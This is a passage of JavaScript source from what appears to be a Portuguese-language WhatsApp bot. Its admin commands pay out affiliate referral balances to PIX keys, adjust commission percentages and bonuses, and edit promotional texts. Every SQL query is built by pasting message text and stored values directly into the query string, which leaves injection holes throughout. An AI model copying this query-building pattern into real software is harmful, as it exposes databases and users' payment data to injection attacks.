            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("ID_ASSOb#") > -1 && Adms.includes(Numero)) {
            Rowid_Asso = Mensagem_Texto.split("ID_ASSOb#")
            Rowid_Asso = Rowid_Asso[1].split("#")
            Rowid_Asso = Rowid_Asso[0]
            console.log("ID_ASSO: " + Rowid_Asso)

            NOME_ASSO = await DataBase_Better.prepare(`SELECT NOME FROM CONTATOS WHERE _rowid_ = '${Rowid_Asso}'`).get()["NOME"]
            ID_CONTATO_ASSO = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE _rowid_ = '${Rowid_Asso}'`).get()["ID_CONTATO"]
            NUMERO_ASSO = ID_CONTATO_ASSO.toString().replace(/[^0-9]/igm, ``);
            SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE _rowid_ = '${Rowid_Asso}'`).get()["SALDO_INDICACAO"]
            SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2);
            CHAVEPIX_ASSO = await DataBase_Better.prepare(`SELECT CHAVEPIX_INDICADO FROM CONTATOS WHERE _rowid_ = '${Rowid_Asso}'`).get()["CHAVEPIX_INDICADO"]

            await DataBase_Better.prepare(`INSERT INTO PAGAMENTOS_ASSOCIADO (ID_CONTATO,VALOR_PAGO,DATA_MS_INSERIDO) VALUES ('${ID_CONTATO_ASSO}','${SALDO_INDICACAO}','${Date.now()}') ON CONFLICT DO NOTHING`).run()
            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '0' WHERE _rowid_ = '${Rowid_Asso}'`).run()

            Texto = `💰 *VOCÊ PAGOU R$:${SALDO_INDICACAO} AO ASSOCIADO ${NOME_ASSO}* 💰

*O saldo de indicação do mesmo, foi zerado!*

*O associado foi notificado!*
`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            Texto_Indicado = `💰 *VOCÊ RECEBEU R$:${SALDO_INDICACAO} EM SUA CHAVE PIX* 💰

*CHAVE PIX DEFINIDA POR VOCÊ:*
${CHAVEPIX_ASSO}
`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto_Indicado}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/assopercentgeral===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                PERCENTUAL_ASSO_GERAL_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
                PERCENTUAL_ASSO_GERAL = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${PERCENTUAL_ASSO_GERAL}' WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).run()
                Texto = `*PERCENTUAL DE LUCRO SOBRE VENDA (GERAL) ALTERADO COM SUCESSO!*

*ANTES:* ${PERCENTUAL_ASSO_GERAL_Ant}

*AGORA:* ${PERCENTUAL_ASSO_GERAL}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/assopercent===") > -1 && Adms.includes(Numero)) {
            try {
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
                msg = Mensagem_Texto.split("===")

                if (msg[1] === "" || Array_Total_Igual.length != 6) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                USUARIO = msg[1]

                PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${USUARIO}@c.us'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                NOVO_PERCENTUAL_ADICIONAL_ASSOCIADO = msg[2]

                Texto = `*PERCENTUAL DE LUCRO SOBRE VENDA (USER ESPECÍFICO) ALTERADO COM SUCESSO!*

*USUÁRIO:* ${USUARIO}
*PERCENTUAL ANTERIOR:* ${PERCENTUAL_ADICIONAL_ASSOCIADO}
*PERCENTUAL ATUAL:* ${NOVO_PERCENTUAL_ADICIONAL_ASSOCIADO}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE CONTATOS SET PERCENTUAL_ADICIONAL_ASSOCIADO = '${NOVO_PERCENTUAL_ADICIONAL_ASSOCIADO}' WHERE ID_CONTATO = '${USUARIO}@c.us'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/indicadoassobonus===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                BONUS_VIROU_INDICADO_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_VIROU_INDICADO'`).get()["VALOR"]
                BONUS_VIROU_INDICADO = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${BONUS_VIROU_INDICADO}' WHERE PARAMETRO = 'BONUS_VIROU_INDICADO'`).run()
                Texto = `*BÔNUS AO VIRAR INDICADO ALTERADO COM SUCESSO!*

*ANTES:* ${BONUS_VIROU_INDICADO_Ant}

*AGORA:* ${BONUS_VIROU_INDICADO}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textotornarasso===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                TEXTO_TORNE_ASSO = msg[1]
                TEXTO_TORNE_ASSO = TEXTO_TORNE_ASSO.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_TORNE_ASSO}' WHERE PARAMETRO = 'TEXTO_TORNE_ASSO'`).run()

                Texto = `*TEXTO TORNE-SE UM ASSOCIADO ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textovirouasso===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                TEXTO_VIROU_ASSO = msg[1]
                TEXTO_VIROU_ASSO = TEXTO_VIROU_ASSO.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_VIROU_ASSO}' WHERE PARAMETRO = 'TEXTO_VIROU_ASSO'`).run()

                Texto = `*TEXTO ACEITOU SER UM ASSOCIADO ALTERADO COM SUCESSO!*`
